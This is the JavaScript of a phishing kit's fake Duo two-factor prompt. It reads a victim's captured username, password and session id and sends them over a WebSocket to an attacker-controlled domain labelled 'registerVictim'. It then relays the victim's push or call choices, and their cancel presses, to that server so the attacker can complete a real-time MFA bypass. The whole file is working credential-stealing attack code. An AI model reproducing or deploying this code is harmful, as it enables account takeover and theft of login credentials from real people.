// Called when DUO iframe has loaded
function loaded() {
    window.user   = document.getElementById("user").innerHTML;
    window.pass   = document.getElementById("pass").innerHTML;
    window.sid    = document.getElementById("sid").innerHTML;
    window.mobile = document.getElementById("mobile").innerHTML.includes("true")? true : false;
    console.log("Session is:", window.sid);

    // Opens a new socket that connects to spoofer's machine.
    // This socket keeps itself alive by receiving pong's for every
    // ping it sends out. After sending a ping, the server has 
    // a set time to receive a pong. Else, the socket dies and tries
    // to re-create itself. Socket handles receving data such as
    // when user calls with duo, what his phone number is, etc.
    // Upon such data, socket reflects local duo iframe's changes.
    function initSock() {
        var sock = new WebSocket("wss://" + window.ATTACK_DOM_NAME + ":80");
        window.sock = sock;

        // Try to stay alive by keeping alive=true
        var alive = true;
        sock.onclose = function(e) {
            console.log("Socket died. Error: " + e.code)

            // Socket closed. If user logged in, die. If not, try to
            // live again.
            setTimeout(function() {
                if (window.localStorage.getItem("loggedIn") != "true") {
                    console.log("re-connecting now");
                    initSock();
                }
                else console.log("not reconnectnig cuz succ");
            }, 500);
        }
        sock.onopen = function() {      

            // Start pingInterval every 4 seconds. Checks if still alive.
            var pingInterval = setInterval(function() {
                if (!alive) {
                    clearInterval(pingInterval);
                    sock.close(4001);
                    return;
                }
                // if logged in, stop sending pings to kill self
                if (window.localStorage.getItem("loggedIn") != true)
                    sock.send(JSON.stringify({"ping":window.sid}));
                alive = false;
            }, 4000);

            // send register victim request to server
            sock.send(JSON.stringify({
                "action"    : "registerVictim",
                "username"  : window.user,
                "password"  : window.pass,
                "sid"       : window.sid,
                "id"        : "victim"
            }));

            // On message received from server
            sock.addEventListener("message", function(event) {
                data = JSON.parse(event.data)

                // If it's a pong message, socket gets to live another day
                if (data.pong != undefined) {
                    alive = true;
                    console.log("Received pong:" + data.pong);
                    return;
                }

                console.log("received msg");
                console.log(event);

                // If number is defined, update number by setting DUO iframe
                if (data.number != undefined)
                    frameDoc.getElementById("phone-number")
                        .innerHTML = "Dialing " + data.number + "...";
                    if (window.authMethod == 1)
                        showMsg('msg-call-1');
                    else 
                        window.phoneNum = data.number;

                // Received logged in packet. Call login callback
                if (data.status == "loggedIn") {
                    showMsg("msg-succ")
                    window.localStorage.setItem("loggedIn", "true");
                    window.sock.close(1000)
                    window.sock = undefined;
                    setTimeout(function() {
                        loginSucc();
                    }, 1000);
                }

                // Received User answered phone call, so update UI
                if (data.status == "callAnswered")
                    showMsg("msg-call-2")
            });
        }
    }
    initSock();

    // Play startup loading animations. Different loading for mobile / web
    var frame = document.getElementById("duo_iframe");
    var frameDoc = frame.contentWindow.document;

    frame.contentWindow.loadAnim();
    if (window.mobile) { 
        setTimeout(()=>{
            document.getElementById("duo_help").style.display='block';
            document.getElementById("footer").style.display='block';
            setTimeout(()=>{
                document.getElementById("duo_iframe")
                    .style.visibility='visible';
            }, 500);
        }, 2000);
    }
    else {
        // 2000, 2000, 3500, 1900
        setTimeout(() => {
            frame.style.display = "inline-block";
            setTimeout(() => {
                frame.style.display = "none";
            }, 1000);
        }, 2000) 
        setTimeout(() => {
            document.getElementsByClassName("clearfloat")[0]
                .style.display = "block";
            setTimeout(()=> {
                frame.style.display = "inline-block";
            }, 1700)
        }, 1900)
    }

    // Set on-click handler for DUO Push notification button
    frameDoc.getElementById("pushme").onclick = function() {
        sendAuthMethod(0)       
        window.authMethod = 0;
        setTimeout(function() {
            showMsg("msg-push");
        }, 500);
    }
 
    // Set on-click handler for DUO Phone call button
    frameDoc.getElementById("callme").onclick = function() {
        sendAuthMethod(1)       
        if (window.phoneNum == undefined) {
            window.authMethod = 1;
            setTimeout(function() {
                showMsg("msg-call-0");  // Shows the 'Dialing...'
            }, 500);
        }
        else {
            setTimeout(function() {
                showMsg("msg-call-0");
                setTimeout(function() {
                    showMsg("msg-call-1"); // Shows the 'Calling 956-XXX-XXXX'
                }, 800);
            }, 200);
        }
    }
 

    // on click handler for cancel pressed button
    function cancelHandler() {
        var messages = frameDoc.getElementsByClassName("msg");

        // hide all messages
        for (var i = 0; i < messages.length; i++) hideMsg(messages[i].id);

        // Show cancel snackbar
        showMsg("msg-cancel");
        setTimeout(function() {
            hideMsg("msg-cancel");  
            showMsg("msg-cancel-final");
            frameDoc.getElementsByClassName("base-body")[0].style.opacity = "1";
        }, 1500);
        
        // Send cancelPressed to backend
        window.sock.send(JSON.stringify({
                "action"        : "cancelPressed",
                "id"            : "victim",
                "sid"           : window.sid
        }));
    }

    // Shows a snackbar message by id
    function showMsg(id) {
        frameDoc.getElementById(id).style.bottom = "0px";
        try {
            frameDoc.getElementById(id).getElementsByClassName("btn-cancel")[0]
                .onclick = cancelHandler;
        } catch(e){};
    }

    // Hides a snackbar message by id
    function hideMsg(id) {
        if (frameDoc.getElementById(id).getElementsByTagName("button").length != 0 
            && window.location.href.includes('mobile')) { 
            return frameDoc.getElementById(id).style.bottom = "-75px";
        }
        frameDoc.getElementById(id).style.bottom = "-51px";
    }

    function sendAuthMethod(m) {
        frameDoc.getElementsByClassName("base-body")[0].style.opacity = "0.5";
        window.sock.send(JSON.stringify({
            "action"        : "setAuthMethod",
            "authm"         : "" + m,
            "sid"           : window.sid,
            "id"            : "victim"
        }));
    }
    function loginSucc() {
        window.postMessage("finished", "*");
        /*window.postMessage({
            move : '/exit-site/final.html',
            url  : '/' + window.FINAL_DOM.split("/").slice(3).join('/'),
            load : '0'
        }, '*');*/
    }
};

var poll = setInterval(()=>{
    var frame = document.getElementById("duo_iframe");
    if (frame != null) {
        setTimeout(()=>loaded(), 100);
        clearInterval(poll);
    }
}, 50);

